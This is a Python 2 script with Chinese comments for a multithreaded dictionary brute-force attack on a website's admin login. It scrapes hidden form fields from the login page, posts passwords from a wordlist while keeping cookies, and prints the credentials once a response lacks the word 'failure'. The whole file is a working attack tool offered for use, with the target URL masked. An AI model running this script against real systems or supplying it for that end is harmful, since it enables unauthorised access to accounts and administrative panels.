#!/usr/bin/env python
#-*- coding:utf-8 -*-
#网站后台字典爆破
#具体情况可改代码

import urllib2
import urllib
import cookielib
import threading
import sys
import Queue

from HTMLParser import HTMLParser
#爆破线程
user_thread=10
#设置用户名，也可生成字典
username="username"
wordlist_file="password.txt"
resume=None

target_url="http://www.*******.com/login"
target_post="http://www.*******.com/auth"
#提交的参数，具体可改
username_field="username"
password_field="password"

success_check="Administration - Control Panel"
#爆破总类
class Bruter(object):
    """docstring for Bruter"""
    def __init__(self, username,words):
        self.username=username
        self.password_q=words
        self.found=False

        print "Finish setting up for: %s"%username
    #开启爆破线程
    def  run_bruteforce(self):
        for i in range(user_thread):
            t=threading.Thread(target=self.web_bruter)
            t.start()
    #爆破方法
    def web_bruter(self):
        while not self.password_q.empty() and not self.found:
            #取出尝试密码
            brute=self.password_q.get().rstrip()
            #储存cookie
            jar=cookielib.FileCookieJar("cookies")
            #初始化打开器，要求保存cookie到jar
            opener=urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))

            #打开登录页面
            response=opener.open(target_url)
            page=response.read()
            print 'Trying: %s : %s (%d left)'%(self.username,brute,self.password_q.qsize())
            #初始化爬虫，爬取表单内容
            parser=BruterParser()
            parser.feed(page)
            #得到返回结果
            post_tags=parser.tag_results
            #设置提交内容
            post_tags[username_field]=self.username
            post_tags[password_field]=brute
            #转换键值为post格式
            login_data=urllib.urlencode(post_tags)
            #打开起提交内容，将cookie一并提交
            login_response=opener.open(target_post,login_data)
            #读取响应
            login_result=login_response.read()
            #找到成功与失败的差异，由此判断是否成功
            if 'failure' not in login_result:
                self.found=True

                print '[*] Bruteforce successful'
                print '[*] Username: %s'%username
                print '[*] Password: %s'%brute
                print '[*] Waiting for other threads to exit...'
#爬虫类，爬去input表单内容
class BruterParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results={}

    def handle_starttag(self,tag,attrs):
        if tag == "input":
            tag_name=None
            tag_value=None
            for name,value in attrs:
                if name == "name":
                    tag_name=value
                if  name == "value":
                    tag_value=value
                if tag_name is not None:
                    self.tag_results[tag_name]=tag_value
#读入字典生成Queue对象
def build_wordlist(wordlist_file):
    # read in the word list
    #打开字典文件
    fd = open(wordlist_file, "rb")
    #返回每一行的列表
    raw_words = fd.readlines()
    fd.close()
    #是否找到恢复点
    found_resume = False
    words = Queue.Queue()
    #开始初始化Queue
    for word in raw_words:
        #去除末尾空格符
        word = word.rstrip()
        #如果需要恢复
        if resume is not None:
            #如果找到了恢复点，开始加入Queue
            if found_resume:
                words.put(word)
            else:
                #如果当前word为恢复点
                if word == resume:
                    found_resume = True
                    print "Resuming wordlist from: %s" % resume

        else:
            words.put(word)
    #返回Queue对象
    return words
#生成字典
words=build_wordlist(wordlist_file)
#初始化爆破类
bruter_obj=Bruter(username,words)
#调用方法开启多线程
bruter_obj.run_bruteforce()
